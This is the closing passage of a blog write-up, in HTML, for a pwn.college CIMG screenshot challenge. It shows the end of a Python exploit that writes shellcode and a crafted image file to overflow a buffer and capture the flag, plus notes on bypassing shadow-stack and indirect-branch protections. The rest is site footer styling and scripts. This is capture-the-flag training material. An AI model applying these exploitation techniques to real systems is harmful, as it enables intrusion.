class="string">&quot;&lt;Q&quot;</span>, payload, <span class="number">134</span>, buf_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SC_FILE, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] sc.bin      = <span class="subst">&#123;SC_FILE&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build CIMG: load sprite, render, screenshot (overflow), sleep (trigger jump)</span></span><br><span class="line">    exp = <span class="built_in">bytearray</span>()</span><br><span class="line">    exp += hdr(<span class="number">4</span>)</span><br><span class="line">    exp += d_load(<span class="number">0</span>, SC_FILE)</span><br><span class="line">    exp += d_render(<span class="number">0</span>)</span><br><span class="line">    exp += d_screenshot(<span class="number">0</span>, w=<span class="number">144</span>)</span><br><span class="line">    exp += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">7</span>) + struct.pack(<span class="string">&quot;&lt;i&quot;</span>, <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FNAME, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(exp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] exploit     = <span class="subst">&#123;FNAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Running exploit...&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    proc = subprocess.run([BIN, FNAME], capture_output=<span class="literal">True</span>, timeout=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    flag = re.search(<span class="string">rb&#x27;pwn\.college\&#123;[^&#125;]+\&#125;&#x27;</span>, proc.stdout)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">55</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] FLAG: <span class="subst">&#123;flag.group().decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">55</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    clean = re.sub(<span class="string">rb&#x27;\x1b\[[0-9;]*m&#x27;</span>, <span class="string">b&#x27;&#x27;</span>, proc.stdout)</span><br><span class="line">    <span class="keyword">if</span> clean.strip():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Output: <span class="subst">&#123;clean[:<span class="number">500</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Exit: <span class="subst">&#123;proc.returncode&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Binary: <span class="subst">&#123;BIN&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    ss = leak_startstack()</span><br><span class="line">    build_exploit(ss)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="关键要点">9. 关键要点</h2>
+<ol type="1">
+<li><p><strong>数据流不透明时，实证测试优先于静态分析</strong>——handle_4
+的渲染旋转无法仅通过阅读反汇编代码完全理解，但用标记 payload
+验证只需要几分钟。</p></li>
+<li><p><strong><code>mov al, N</code></strong>——在 x86-64 上设置 syscall
+号时，必须先用 <code>xor eax, eax</code> 清零，或使用
+<code>mov eax, N</code>（32 位 mov 自动清零高 32 位）。</p></li>
+<li><p><strong>SHSTK + IBT 绕过</strong>——<code>notrack jmp</code>
+前缀同时绕过间接分支追踪和影子栈检查。覆盖 saved rbx
+而非返回地址是正确的选择。</p></li>
+<li><p><strong>利用文件名影响栈布局</strong>——泄露和利用使用相同的文件名，避免
+argv 差异导致栈偏移变化。</p></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>vkkkv
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/" title="PwnCollege - Integrated Security - CIMG Screenshots">https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/reverse/" rel="tag"><i class="fa fa-tag"></i> reverse</a>
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/pwncollege/" rel="tag"><i class="fa fa-tag"></i> pwncollege</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/linux/qbittorrent-caddy-pt-vps/" rel="prev" title="qBittorrent-nox Service Setup">
+                  <i class="fa fa-angle-left"></i> qBittorrent-nox Service Setup
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">vkkkv</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9taXN0Lw==">NexT.Mist</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"blog-3yiidetljv","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/comments/disqus.min.js" defer></script>
+<!-- ============================================================
+     BACKGROUND HUD OVERLAYS
+     ============================================================ -->
+<!-- Scanlines + noise -->
+<div class="hud-background-overlay"></div>
+<div class="hud-data-wash"></div>
+
+<!-- Background Title Projection -->
+<div
+  class="hud-title-projection"
+  id="bg-title-projection"
+  style="display: none"
+></div>
+
+<script>
+  (function () {
+    const projection = document.getElementById("bg-title-projection");
+    if (!projection) return;
+
+    let activeAnchor = null;
+    let observer = null;
+    let rafId = null;
+
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
+    let currentY = 0; // 渲染位置
+    let targetY = 0; // 目标位置
+    let isUpdating = false; // 正在执行内容更新锁
+
+    function updateText(text) {
+      const newText = text.trim().toUpperCase();
+      if (!newText || projection.textContent === newText || isUpdating) return;
+
+      isUpdating = true;
+      projection.style.opacity = 0;
+
+      // 等待淡出完成后再执行内容和位置变更
+      setTimeout(() => {
+        projection.textContent = newText;
+
+        // 【关键】在文字不可见时，同步坐标位置，防止新标题出现时的“大幅度滑动”
+        if (activeAnchor) {
+          const rect = activeAnchor.getBoundingClientRect();
+          const centerY = window.innerHeight * 0.3;
+          targetY = currentY = (rect.top - centerY) * parallaxFactor;
+        }
+
+        projection.style.opacity = 1;
+        // 等待淡入完成后解锁
+        setTimeout(() => {
+          isUpdating = false;
+        }, 1200);
+      }, 1200);
+    }
+
+    function tick() {
+      if (activeAnchor) {
+        const rect = activeAnchor.getBoundingClientRect();
+        const centerY = window.innerHeight * 0.3;
+        targetY = (rect.top - centerY) * parallaxFactor;
+      }
+
+      // 仅在非更新期间应用平滑缓动
+      if (!isUpdating) {
+        currentY += (targetY - currentY) * lerpFactor;
+      }
+
+      projection.style.transform = `translate3d(-50%, ${currentY}px, 0)`;
+      rafId = requestAnimationFrame(tick);
+    }
+
+    function start() {
+      // 清理旧观察者，防止 PJAX 重复绑定
+      if (observer) observer.disconnect();
+
+      const targets = document.querySelectorAll(
+        ".post-title, .post-body h2, .post-body h3",
+      );
+
+      observer = new IntersectionObserver(
+        (entries) => {
+          // 找到正在进入视野的标题
+          const visible = entries.filter((e) => e.isIntersecting);
+          if (visible.length > 0) {
+            // 选取最上方的标题作为基准
+            const topOne = visible.sort(
+              (a, b) => a.boundingClientRect.top - b.boundingClientRect.top,
+            )[0];
+            activeAnchor = topOne.target;
+            updateText(topOne.target.textContent);
+          }
+        },
+        {
+          rootMargin: "-10% 0% -60% 0%",
+          threshold: 0,
+        },
+      );
+
+      targets.forEach((t) => observer.observe(t));
+
+      // 初始化或 PJAX 恢复
+      const initialTitle =
+        document.querySelector(".post-title") ||
+        document.querySelector(".site-title");
+      if (initialTitle) {
+        if (!projection.textContent) {
+          projection.textContent = initialTitle.textContent
+            .trim()
+            .toUpperCase();
+          projection.style.display = "block";
+          projection.style.opacity = 1;
+          activeAnchor = initialTitle;
+          const rect = initialTitle.getBoundingClientRect();
+          currentY = targetY =
+            (rect.top - window.innerHeight * 0.3) * parallaxFactor;
+        } else {
+          // PJAX 加载新页面，使用平滑切换
+          activeAnchor = initialTitle;
+          updateText(initialTitle.textContent);
+        }
+      }
+
+      // 确保只有一个动画循环在运行
+      if (!rafId) rafId = requestAnimationFrame(tick);
+    }
+
+    start();
+    document.addEventListener("pjax:success", start);
+  })();
+</script>
+
+<style>
+  .hud-title-projection {
+    position: fixed;
+    top: 30vh;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 10vw;
+    font-weight: 900;
+    color: rgba(255, 255, 255, 0.05);
+    text-transform: uppercase;
+    white-space: nowrap;
+    pointer-events: none;
+    z-index: -2;
+    user-select: none;
+    font-family: "Roboto Mono", monospace;
+    letter-spacing: -2px;
+    filter: blur(1.2px);
+    opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
+    transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+    will-change: transform, opacity;
+  }
+</style>
+
+<!-- Background Geometric Graphics -->
+<div class="hud-bg-graphic-right"></div>
+
+<!-- Particle Clusters -->
+<div
+  class="hud-particle-cluster"
+  style="bottom: 20%; right: 10%; width: 200px; height: 200px"
+>
+  <span style="top: 10%; left: 20%"></span>
+  <span style="top: 30%; left: 80%"></span>
+  <span style="top: 70%; left: 40%"></span>
+  <span style="top: 50%; left: 10%"></span>
+  <span style="top: 90%; left: 60%"></span>
+  <span style="top: 20%; left: 50%"></span>
+</div>
+
+<!-- Geometric decals: axis lines, rings, grid markers, dim text -->
+<div class="hud-geometric-decals">
+  <span class="axis-h" style="top: 35%"></span>
+  <span class="axis-v" style="left: 62%"></span>
+
+  <!-- Fragmented rings -->
+  <span
+    class="decal-ring"
+    style="
+      top: 8%;
+      right: -60px;
+      width: 220px;
+      height: 220px;
+      transform: rotate(12deg);
+    "
+  ></span>
+  <span
+    class="decal-ring"
+    style="
+      bottom: 15%;
+      left: -40px;
+      width: 180px;
+      height: 180px;
+      transform: rotate(-8deg);
+    "
+  ></span>
+  <span
+    class="decal-ring"
+    style="top: 55%; right: 30%; width: 140px; height: 140px"
+  ></span>
+
+  <!-- Ring edge dots -->
+  <span class="ring-dot" style="top: 14%; right: 42px"></span>
+  <span class="ring-dot" style="bottom: 67%; left: 46px"></span>
+
+  <!-- Grid markers: + signs, crosshairs, hollow squares -->
+  <span class="grid-marker" style="top: 12%; left: 18%">+</span>
+  <span class="grid-marker" style="top: 28%; left: 74%">+</span>
+  <span class="grid-marker" style="top: 62%; left: 88%">+</span>
+  <span class="grid-marker cross" style="top: 20%; left: 38%"></span>
+  <span class="grid-marker cross" style="top: 72%; left: 22%"></span>
+  <span class="grid-marker cross" style="top: 45%; left: 58%"></span>
+  <span class="grid-marker square" style="top: 8%; left: 82%"></span>
+  <span class="grid-marker square" style="top: 80%; left: 68%"></span>
+  <span class="grid-marker square" style="top: 52%; left: 12%"></span>
+
+  <!-- Technical text -->
+  <div class="decal-labels">
+    <span class="decal-text t1">SYSTEM STATUS: ACTIVE</span>
+    <span class="decal-text t2">ENCRYPTED SECTOR 7</span>
+    <span class="decal-text t3">PRTS_TERMINAL_V2.0</span>
+    <span class="decal-text t4">PROTOCOL: 0x2A</span>
+    <span class="decal-text t5">ENCRYPTED DATA STREAM</span>
+    <span class="decal-text t6">SYSTEM: ONLINE</span>
+  </div>
+</div>
+
+<!-- Fixed red particle "dead pixels" -->
+<div class="hud-particles" aria-hidden="true">
+  <span class="hud-particle" style="top: 8%; left: 18%"></span>
+  <span class="hud-particle" style="top: 22%; left: 72%"></span>
+  <span class="hud-particle" style="top: 65%; left: 35%"></span>
+  <span class="hud-particle" style="top: 78%; left: 85%"></span>
+  <span class="hud-particle" style="top: 35%; left: 58%"></span>
+  <span class="hud-particle" style="top: 90%; left: 12%"></span>
+  <span class="hud-particle" style="top: 15%; left: 42%"></span>
+</div>
+
+<!-- ============================================================
+     TACTICAL VERTICAL DATA BUS (Scroll Progress & Glitch Text)
+     ============================================================ -->
+<div class="hud-vertical-bus" id="tacticalBus" aria-hidden="true">
+  <div class="bus-track"></div>
+  <div class="bus-progress" id="busProgress"></div>
+  
+  <div class="bus-text">
+    <div class="word-group">
+      <span>C</span><span>O</span><span>D</span><span>E</span>
+    </div>
+    <div class="bus-separator"></div>
+    <div class="word-group">
+      <span class="node-square">A</span><span>N</span><span>A</span><span class="node-diamond">L</span><span>Y</span><span>Z</span><span>E</span>
+    </div>
+    <div class="bus-separator"></div>
+    <div class="word-group">
+      <span>S</span><span>O</span><span>L</span><span>V</span><span>E</span>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     CUSTOM CURSOR STALKER
+     ============================================================ -->
+<div id="cursor-container" aria-hidden="true">
+  <div id="cursor-outer"></div>
+  <div id="cursor-dot"></div>
+  <div id="cursor-effect"></div>
+</div>
+
+<script>
+  (() => {
+    "use strict";
+    if (!window.matchMedia("(any-hover: hover)").matches) return;
+
+    /* ─── Config ─── */
+    const CFG = {
+      smooth: 0.025,
+      convergence: 0.1,
+      stretchFactor: 0.04,
+      maxStretch: 0.2,
+      stickiness: 0.6,
+      outerSize: 36,
+      hoverOuterSize: 24,
+      rippleDuration: 500,
+      rippleTransition:
+        "transform .5s cubic-bezier(0.22, 0.61, 0.21, 1), opacity .5s cubic-bezier(0.22, 0.61, 0.21, 1)",
+    };
+
+    const SEL = `a,input,button,textarea,
+      .navBtnIcon,
+      #post-content img,
+      .ex-header,
+      .gt-user-inner,
+      .wl-sort>li,
+      #valine .vicon,#valine .vat,
+      .lg-container img,.clickable,
+      .toggle,
+      #exturl,
+      #post-title,
+      .article-title,
+      .nav-link,
+      .copy-btn,
+      .badge-normal`;
+
+    /* ─── Cursor Class ─── */
+    class Cursor {
+      constructor() {
+        this.now = null;
+        this.first = true;
+        this.last = 0;
+        this.moveIng = false;
+        this.fadeIng = false;
+        this.nowX = 0;
+        this.nowY = 0;
+        this.prevX = 0;
+        this.prevY = 0;
+        this.target = null;
+        this._hoverDirty = false;   // flagged after hold/relax
+
+        // Persistent RAF callback — avoid allocating per frame
+        this._boundMove = this._move.bind(this);
+
+        const node = document.getElementById("cursor-container");
+        if (!node) return;
+
+        this.os = node.querySelector("#cursor-outer")?.style;
+        this.ds = node.querySelector("#cursor-dot")?.style;
+        this.es = node.querySelector("#cursor-effect")?.style;
+        if (!this.os || !this.ds || !this.es) return;
+
+        // Hide offscreen until first mousemove
+        this.os.top = "-100%";
+        this.ds.top = "-100%";
+        this.es.transform = "translate(-50%, -50%) scale(0)";
+        this.es.opacity = "1";
+
+        // Event delegation — NO MutationObserver
+        document.addEventListener("mousemove", this, { passive: true });
+        document.addEventListener("click", this, { passive: true });
+        document.addEventListener("mouseover", this, { passive: true });
+        document.addEventListener("mouseout", this, { passive: true });
+        document.addEventListener("pjax:send", this, { passive: true });
+        document.addEventListener("popstate", this, { passive: true });
+      }
+
+      /* handleEvent — avoids per-listener bind() */
+      handleEvent(e) {
+        switch (e.type) {
+          case "mousemove": return this._reset(e);
+          case "click":     return this._ripple(e);
+          case "mouseover": return this._hold(e);
+          case "mouseout":  return this._relax(e);
+          case "pjax:send":
+          case "popstate":  return this._resetState();
+        }
+      }
+
+      /* ── RAF tick ── */
+      _move(ts) {
+        if (this.now === null) return;
+
+        const dxT = this.now.x - this.nowX;
+        const dyT = this.now.y - this.nowY;
+        const dt = Math.min(CFG.smooth * (ts - this.last), 1);
+        this.nowX += dxT * dt;
+        this.nowY += dyT * dt;
+
+        // Stretch squash along velocity
+        const dvx = this.nowX - this.prevX;
+        const dvy = this.nowY - this.prevY;
+        const spd = Math.sqrt(dvx * dvx + dvy * dvy);
+        const str = Math.min(spd * CFG.stretchFactor, CFG.maxStretch);
+        const ang = Math.atan2(dvy, dvx);
+
+        // Batch hover-size changes into RAF (avoid layout thrash)
+        if (this._hoverDirty) {
+          this.os.height = this._hH;
+          this.os.width  = this._hW;
+          this.os.background = this._hBg;
+          this._hoverDirty = false;
+        }
+
+        this.os.transform =
+          `translate(calc(${this.nowX.toFixed(2)}px - 50%), calc(${this.nowY.toFixed(2)}px - 50%))` +
+          ` rotate(${ang}rad) scale(${1 + str}, ${1 - str})`;
+
+        this.prevX = this.nowX;
+        this.prevY = this.nowY;
+        this.last = ts;
+
+        if (Math.abs(dxT) > CFG.convergence || Math.abs(dyT) > CFG.convergence) {
+          requestAnimationFrame(this._boundMove);
+        } else {
+          this._snap();
+          this.moveIng = false;
+        }
+      }
+
+      _snap() {
+        if (!this.now) return;
+        this.os.transform =
+          `translate(calc(${this.now.x.toFixed(2)}px - 50%), calc(${this.now.y.toFixed(2)}px - 50%))`;
+      }
+
+      /* ── mousemove ── */
+      _reset(e) {
+        if (this.first) {
+          this.os.top = "0";
+          this.os.left = "0";
+          this.ds.top = "0";
+          this.ds.left = "0";
+          this.nowX = e.x;
+          this.nowY = e.y;
+          this.prevX = e.x;
+          this.prevY = e.y;
+          this._snap();
+          this.first = false;
+        }
+
+        if (!this.moveIng) {
+          this.moveIng = true;
+          requestAnimationFrame(this._boundMove);
+        }
+
+        // Stickiness — attract outer toward hovered element center
+        if (this.target) {
+          this.now = {
+            x: e.x + (this.target.cx - window.scrollX - e.x) * CFG.stickiness,
+            y: e.y + (this.target.cy - window.scrollY - e.y) * CFG.stickiness,
+          };
+        } else {
+          this.now = { x: e.x, y: e.y };
+        }
+
+        // Dot tracks real mouse always (no stickiness)
+        this.ds.transform = `translate(calc(${e.x.toFixed(2)}px - 50%), calc(${e.y.toFixed(2)}px - 50%))`;
+      }
+
+      /* ── click ripple ── */
+      _ripple(e) {
+        if (this.fadeIng) return;
+        this.fadeIng = true;
+        this.es.left = e.x + "px";
+        this.es.top = e.y + "px";
+        this.es.transition = CFG.rippleTransition;
+        this.es.transform = "translate(-50%, -50%) scale(1)";
+        this.es.opacity = "0";
+        setTimeout(() => {
+          this.fadeIng = false;
+          this.es.transition = "";
+          this.es.transform = "translate(-50%, -50%) scale(0)";
+          this.es.opacity = "1";
+        }, CFG.rippleDuration);
+      }
+
+      /* ── hover — event delegation, no per-element binding ── */
+      _hold(e) {
+        const el = e.target.closest(SEL);
+        if (!el) return;
+        const r = el.getBoundingClientRect();
+        this.target = {
+          cx: r.left + r.width / 2 + window.scrollX,
+          cy: r.top + r.height / 2 + window.scrollY,
+        };
+        this._hoverDirty = true;
+        this._hH = CFG.hoverOuterSize + "px";
+        this._hW = CFG.hoverOuterSize + "px";
+        this._hBg = "var(--theme-cursor-bg)";
+      }
+
+      _relax(e) {
+        const rel = e.relatedTarget;
+        if (rel && rel.closest && rel.closest(SEL)) return;
+        this.target = null;
+        this._hoverDirty = true;
+        this._hH = CFG.outerSize + "px";
+        this._hW = CFG.outerSize + "px";
+        this._hBg = "unset";
+      }
+
+      /* ── PJAX reset ── */
+      _resetState() {
+        this.now = null;
+        this.target = null;
+        this.first = true;
+        this.moveIng = false;
+        this.fadeIng = false;
+      }
+    }
+
+    new Cursor();
+  })();
+</script>
+
+<!-- ============================================================
+     BOTTOM-RIGHT HUD GROUP (Badge + ECG)
+     ============================================================ -->
+<div class="hud-status-group" aria-hidden="true">
+  <div class="badge-normal">
+    <span>NORMAL</span>
+  </div>
+
+  <div class="hud-ecg-waveform">
+    <svg viewBox="0 0 100 30" class="seismic-wave">
+      <path
+        d="M0,15 L5,15 L8,13 L11,17 L15,15 L20,15 L23,10 L26,25 L30,2 L34,28 L38,12 L42,15 L48,15 L52,14 L56,16 L60,15 L64,15 L67,11 L70,24 L74,4 L78,26 L82,13 L86,15 L92,15 L100,15"
+      />
+    </svg>
+  </div>
+
+  <span class="grid-marker cross hud-group-cross"></span>
+</div>
+
+<style>
+  /* HUD Group Layout */
+  .hud-status-group {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    z-index: 999;
+    pointer-events: none;
+  }
+
+  /* NORMAL Badge Styling */
+  .badge-normal {
+    position: relative;
+    padding: 4px 14px;
+    background: rgba(255, 62, 62, 0.05);
+    border: 1px solid rgba(255, 62, 62, 0.3);
+    box-shadow:
+      inset 0 0 8px rgba(255, 62, 62, 0.15),
+      0 0 4px rgba(255, 62, 62, 0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    /* 交互修复：显式开启事件响应 */
+    pointer-events: auto !important;
+    user-select: none;
+    z-index: 1001; /* 确保在组合层之上 */
+    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .badge-normal:hover {
+    background: rgba(255, 62, 62, 0.12);
+    border-color: rgba(255, 62, 62, 0.6);
+    transform: translateY(-2px);
+    filter: brightness(1.2);
+  }
+
+  .badge-normal:active {
+    transform: translateY(1px);
+    filter: brightness(0.9);
+  }
+
+  .badge-normal::before,
+  .badge-normal::after {
+    content: "";
+    position: absolute;
+    top: -1px;
+    bottom: -1px;
+    width: 4px;
+  }
+
+  .badge-normal::before {
+    left: -1px;
+    border-left: 2px solid rgba(255, 62, 62, 0.9);
+    box-shadow: -2px 0 4px rgba(255, 62, 62, 0.4);
+  }
+  .badge-normal::after {
+    right: -1px;
+    border-right: 2px solid rgba(255, 62, 62, 0.9);
+    box-shadow: 2px 0 4px rgba(255, 62, 62, 0.4);
+  }
+
+  .badge-normal span {
+    color: #ff3e3e;
+    font-family: "Roboto Mono", monospace;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    line-height: 1.2;
+    text-shadow:
+      0 0 3px rgba(255, 62, 62, 0.8),
+      0 0 8px rgba(255, 62, 62, 0.4);
+  }
+
+  /* Seismic Waveform Styling */
+  .hud-ecg-waveform {
+    width: 110px;
+    height: 35px;
+    opacity: 0.95;
+  }
+
+  .hud-ecg-waveform svg {
+    width: 100%;
+    height: 100%;
+    filter: drop-shadow(0 0 4px rgba(255, 62, 62, 0.8));
+  }
+
+  .hud-ecg-waveform path {
+    stroke: #ff3e3e;
+    stroke-width: 1.5;
+    fill: none;
+    stroke-dasharray: 200;
+    stroke-dashoffset: 200;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    animation: seismic-scan 2s linear infinite;
+  }
+
+  @keyframes seismic-scan {
+    0% {
+      stroke-dashoffset: 200;
+    }
+    50% {
+      stroke-dashoffset: 0;
+    }
+    100% {
+      stroke-dashoffset: -200;
+    }
+  }
+
+  /* Group Cross Marker */
+  .hud-group-cross {
+    position: absolute;
+    bottom: -10px;
+    right: -10px;
+    width: 12px;
+    height: 12px;
+    opacity: 0.6;
+  }
+</style>
+
+<!-- ============================================================
+     CUSTOM CURSOR STALKER
+     ============================================================ -->
+<style>
+  :root {
+    --theme-cursor: #cccccc;
+    --theme-cursor-bg: rgba(204, 204, 204, 0.3);
+    --cursor-outer-size: 36px;
+    --cursor-outer-border: 1px;
+    --cursor-outer-shadow: 0 0 12px rgba(204, 204, 204, 0.28);
+    --cursor-dot-size: 6px;
+    --cursor-dot-shadow: 0 0 10px rgba(255, 255, 255, 0.95);
+    --cursor-effect-size: 80px;
+    --cursor-effect-border: 2px;
+    --cursor-z-outer: 65538;
+    --cursor-z-dot: 65539;
+    --cursor-transition-speed: 0.3s;
+  }
+
+  @media (any-hover: hover) {
+    body,
+    a,
+    button,
+    input,
+    textarea,
+    .copy-btn,
+    .toggle,
+    #exturl,
+    #post-title,
+    .article-title,
+    .nav-link,
+    .badge-normal,
+    #post-content img,
+    .clickable {
+      cursor: none;
+    }
+
+    #cursor-container {
+      pointer-events: none;
+    }
+
+    #cursor-outer {
+      z-index: var(--cursor-z-outer);
+      position: fixed;
+      transform: translate3d(-50%, -50%, 0);
+      height: var(--cursor-outer-size);
+      width: var(--cursor-outer-size);
+      border: var(--cursor-outer-border) solid var(--theme-cursor);
+      border-radius: 50%;
+      pointer-events: none;
+      transition-duration: var(--cursor-transition-speed);
+      transition-property: background-color, width, height;
+      top: -100%;
+      mix-blend-mode: difference;
+      box-shadow: var(--cursor-outer-shadow);
+      will-change: transform;
+    }
+
+    #cursor-dot {
+      position: fixed;
+      top: -100%;
+      left: 0;
+      z-index: var(--cursor-z-dot);
+      width: var(--cursor-dot-size);
+      height: var(--cursor-dot-size);
+      background: var(--theme-cursor);
+      border-radius: 50%;
+      pointer-events: none;
+      box-shadow: var(--cursor-dot-shadow);
+      transform: translate3d(-50%, -50%, 0);
+      will-change: transform;
+    }
+
+    #cursor-effect {
+      z-index: var(--cursor-z-outer);
+      position: fixed;
+      transform: translate3d(-50%, -50%, 0) scale(0);
+      height: var(--cursor-effect-size);
+      width: var(--cursor-effect-size);
+      border: var(--cursor-effect-border) solid var(--theme-cursor);
+      border-radius: 50%;
+      opacity: 0;
+      pointer-events: none;
+      mix-blend-mode: difference;
+    }
+  }
+
+  @media (any-hover: none) {
+    #cursor-container {
+      display: none !important;
+    }
+  }
+</style>
+
+</body>
+</html>
